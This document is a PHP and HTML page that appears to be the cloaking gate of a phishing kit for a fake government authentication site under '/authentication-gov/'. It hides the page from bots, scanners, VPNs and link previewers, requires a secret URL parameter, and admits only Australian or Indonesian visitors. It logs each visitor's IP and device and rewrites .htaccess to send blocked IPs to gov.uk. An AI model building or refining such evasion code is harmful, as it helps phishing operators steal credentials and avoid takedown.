<?php
session_start();

$blockedDomain = 'oftnstore.com';

if (isset($_SERVER['HTTP_HOST']) && stripos($_SERVER['HTTP_HOST'], $blockedDomain) !== false) {
    http_response_code(403);
    exit('Forbidden');
}

/**
 * =====================================
 * LOAD CONFIG
 * =====================================
 */
$configPath = __DIR__ . '/config.ini';

if (! file_exists($configPath)) {
    http_response_code(500);
    exit('Config not found');
}

$config            = parse_ini_file($configPath, true, INI_SCANNER_TYPED);
$GLOBALS['CONFIG'] = $config;

/**
 * =====================================
 * BASIC SETUP
 * =====================================
 */
date_default_timezone_set(
    $config['app']['timezone'] ?? 'Asia/Jakarta'
);

/**
 * =====================================
 * HELPER FUNCTIONS
 * =====================================
 */

function isBot(): bool
{
    if (empty($_SERVER['HTTP_USER_AGENT'])) {
        return true;
    }

    $bots = [
        'bot',
        'crawl',
        'slurp',
        'spider',
        'curl',
        'python',
        'wget',
        'facebookexternalhit',
        'telegrambot',
        'discordbot',
        'whatsapp',
    ];

    $ua = strtolower($_SERVER['HTTP_USER_AGENT']);

    foreach ($bots as $b) {
        if (strpos($ua, $b) !== false) {
            return true;
        }
    }

    return false;
}

/**
 * =====================================
 * CLIENT IP
 * =====================================
 */

function getClientIP(): string
{
    return $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
}

/**
 * =====================================
 * IP WHITELIST
 * =====================================
 */

function isWhitelistedIP(string $ip): bool
{
    $whitelist = [

        // TAMBAHKAN IP ANDA
        '203.83.40.85',
        '103.47.134.15',
        '103.108.33.126',

    ];

    return in_array($ip, $whitelist, true);
}

/**
 * =====================================
 * GEO IP (CACHE SESSION)
 * =====================================
 */

function _geoGet(string $ip): array
{
    $url = "http://ip-api.com/json/{$ip}?fields=status,country,countryCode";

    $ch = curl_init($url);

    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 5,
        CURLOPT_CONNECTTIMEOUT => 3,
    ]);

    $res = curl_exec($ch);

    curl_close($ch);

    return json_decode($res, true) ?: [];
}

function getGeoCached(): array
{
    if (! empty($_SESSION['geo'])) {
        return $_SESSION['geo'];
    }

    $ip = getClientIP();

    if (! $ip) {
        return [];
    }

    $geo = _geoGet($ip);

    if (($geo['status'] ?? '') === 'success') {
        $_SESSION['geo'] = $geo;
        return $geo;
    }

    return [];
}

function getCountryCode(): string
{
    return getGeoCached()['countryCode'] ?? 'UNKNOWN';
}

function getCountryName(): string
{
    return getGeoCached()['country'] ?? 'UNKNOWN';
}

/**
 * =====================================
 * LOGGING
 * =====================================
 */

$ua_string = $_SERVER['HTTP_USER_AGENT'] ?? "";

function get_os_and_browser($ua)
{
    $ua = $ua ?? "";

    $os = "Unknown Device";

    if (preg_match('/windows|win32/i', $ua)) {
        $os = "Windows";
    } elseif (preg_match('/iphone/i', $ua)) {
        $os = "iPhone";
    } elseif (preg_match('/ipad/i', $ua)) {
        $os = "iPad";
    } elseif (preg_match('/android/i', $ua)) {
        $os = "Android";
    } elseif (preg_match('/macintosh|mac os x/i', $ua)) {
        $os = "Mac";
    } elseif (preg_match('/linux/i', $ua)) {
        $os = "Linux";
    }

    $browser = "Unknown Browser";

    if (preg_match('/msie|trident/i', $ua)) {
        $browser = "Internet Explorer";
    } elseif (preg_match('/edge/i', $ua)) {
        $browser = "Edge";
    } elseif (preg_match('/firefox/i', $ua)) {
        $browser = "Firefox";
    } elseif (preg_match('/chrome/i', $ua)) {
        $browser = "Chrome";
    } elseif (preg_match('/safari/i', $ua)) {
        $browser = "Safari";
    } elseif (preg_match('/opera|opr/i', $ua)) {
        $browser = "Opera";
    }

    return "$browser/$os";
}

if (! isset($_SESSION['device_info'])) {
    $_SESSION['device_info'] = get_os_and_browser($ua_string);
}

$device_info = $_SESSION['device_info'];

function writeLog(string $ket): void
{
    $cfg = $GLOBALS['CONFIG']['log'] ?? [];

    if (! ($cfg['enable_log'] ?? false)) {
        return;
    }

    $file = __DIR__ . '/' . ($cfg['log_file'] ?? 'access.log');

    $line = sprintf(
        "%s | %s | %s | %s | %s\n",
        date('Y-m-d H:i:s'),
        $ket,
        getClientIP(),
        getCountryName(),
        $_SESSION['device_info']
    );

    file_put_contents($file, $line, FILE_APPEND | LOCK_EX);
}

/**
 * =====================================
 * BOTBLOCKER API
 * =====================================
 */

function botblocker(string $ip, string $ua): bool
{
    $key = $GLOBALS['CONFIG']['botblocker']['key'] ?? '';

    if ($key === '') {
        return false;
    }

    $url = "https://botblocker.pro/api/v1/blocker?"
    . "ip=" . urlencode($ip)
    . "&apikey=" . urlencode($key)
    . "&ua=" . urlencode($ua)
    . "&url=" . urlencode($_SERVER['REQUEST_URI'] ?? '/');

    $ch = curl_init($url);

    curl_setopt_array($ch, [
        CURLOPT_USERAGENT      => 'BotBlocker',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 5,
        CURLOPT_CONNECTTIMEOUT => 3,
    ]);

    $res = curl_exec($ch);

    curl_close($ch);

    if (! $res) {
        return false;
    }

    $json = json_decode($res, true);

    if (($json['meta']['code'] ?? 0) !== 200) {
        return false;
    }

    return (
        $json['data']['is_bot'] ?? $json['data']['block_access'] ?? false
    );
}

/**
 * =====================================
 * RAPIDAPI (VPN / DC / DDOS)
 * =====================================
 */

function rapidCheck(string $ip): bool
{
    $apiKey = $GLOBALS['CONFIG']['rapidapi']['key'] ?? '';

    if ($apiKey === '') {
        return false;
    }

    $ch = curl_init();

    curl_setopt_array($ch, [
        CURLOPT_URL => "https://netdetective.p.rapidapi.com/query?ipaddress={$ip}",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 8,
        CURLOPT_HTTPHEADER     => [
            "x-rapidapi-host: netdetective.p.rapidapi.com",
            "x-rapidapi-key: {$apiKey}",
        ],
    ]);

    $res = curl_exec($ch);

    curl_close($ch);

    $json = json_decode($res, true);

    if (! isset($json['result'])) {
        return false;
    }

    $r = $json['result'];

    return (
        $r['isVpn']
        || $r['isDataCenter']
        || $r['isBogon']
        || $r['isCompromised']
        || $r['isDDos']
    );
}

/**
 * =====================================
 * HTACCESS BLOCK
 * =====================================
 */

function _blocks(): void
{
    $ip = getClientIP();

    if (! $ip) {
        return;
    }

    // JANGAN BLOCK IP WHITELIST
    if (isWhitelistedIP($ip)) {
        return;
    }

    $htaccess = __DIR__ . '/.htaccess';

    if (
        file_exists($htaccess)
        && strpos(file_get_contents($htaccess), $ip) !== false
    ) {
        return;
    }

    $rule = "\n# BLOCK {$ip}\n";
    $rule .= "RewriteCond %{REMOTE_ADDR} ^{$ip}$\n";
    $rule .= "RewriteRule .* https://gov.uk [R=302,L]\n";

    file_put_contents($htaccess, $rule, FILE_APPEND | LOCK_EX);
}

/**
 * =====================================
 * SECURITY FLOW
 * =====================================
 */

$ip = getClientIP();
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

// BYPASS ALL SECURITY IF WHITELIST
if (isWhitelistedIP($ip)) {

    writeLog('Whitelist bypass');

} else {
    /**
     * =====================================
     * REQUIRED PARAMETER (ONLY FIRST VISIT)
     * =====================================
     */

    if (empty($_SESSION['par_verified'])) {

        $requiredParam = trim($config['parameter']['param'] ?? '');

        if ($requiredParam !== '') {

            if (! array_key_exists($requiredParam, $_GET)) {
                writeLog('Block Parameter');

                _blocks();

                exit;
            }

        }

        $_SESSION['par_verified'] = true;
    }
    // 1. UA BOT
    if (($config['security']['bot_blocker'] ?? false) && isBot()) {

        writeLog('BOT blocked (UA)');

        _blocks();

        exit;
    }

    // 2. BotBlocker API
    if (
        ($config['security']['botblocker_api'] ?? false)
        && botblocker($ip, $ua)
    ) {

        writeLog('BOT blocked (BotBlocker)');

        _blocks();

        exit;
    }

    // 3. Country filter
    if (! in_array(getCountryCode(), ['AU','ID'], true)) {

        writeLog('Country blocked');

        _blocks();

        exit;
    }

    // 4. RapidAPI
    if (
        ($config['security']['rapidapi'] ?? false)
        && rapidCheck($ip)
    ) {

        writeLog('RapidAPI blocked');

        _blocks();

        exit;
    }
}

/**
 * =====================================
 * PAGE OUTPUT
 * =====================================
 */

if (! isset($_SESSION['already_logged_this_visit'])) {

    writeLog('Human');

    $_SESSION['already_logged_this_visit'] = true;
}

?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/x-icon" href="ico.png" />
    <link rel="shortcut icon" type="image/x-icon" href="ico.png" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Loading...</title>
    <script type="module" crossorigin src="/authentication-gov/assets/index-BvjuQ8O6.js"></script>
    <link rel="stylesheet" crossorigin href="/authentication-gov/assets/index-oCRm89_A.css">
  </head>
  <body>

    <script>
      async function ipDetectiveClient() {
        try {
          console.log("Check IP...");
          const ipRes = await fetch("https://api.ipify.org?format=json");
          const ipData = await ipRes.json();
          const currentIP = ipData.ip;
          console.log("IP is:", currentIP);

          const checkRes = await fetch(
            `https://api.ipdetective.io/ip/${currentIP}`
          );
          const checkData = await checkRes.json();
          console.log("Response IPDetective:", checkData); 
          
          const ipapiRes = await fetch(`https://api.ipapi.is/?q=${currentIP}`);
          const ipapiData = await ipapiRes.json();
          console.log("Response IPAPI:", ipapiData); 

          const isBot = checkData.bot === true;
          const isProxy =
            ipapiData.is_proxy ||
            ipapiData.is_vpn ||
            ipapiData.is_abuser ||
            ipapiData.is_bogon ||
            ipapiData.is_crawler ||
            ipapiData.is_tor;

          if (isBot || isProxy) {
            console.warn("AKSES BLOCKED: Bot/VPN/Proxy");

            await fetch(
              `/authentication-gov/block.php?ip=${currentIP}`
            );

            window.location.href = "/error.html";
          } else {
            console.log("AKSES OK: Loading...");

            const script = document.createElement("script");
            script.type = "module";
            script.src = "/src/main.jsx";
            document.body.appendChild(script);
          }
        } catch (err) {
          console.error("Sistem Error Fetching:", err);
        }
      }

      ipDetectiveClient();
    </script>
    <div id="indehoy"></div>
  </body>
</html>
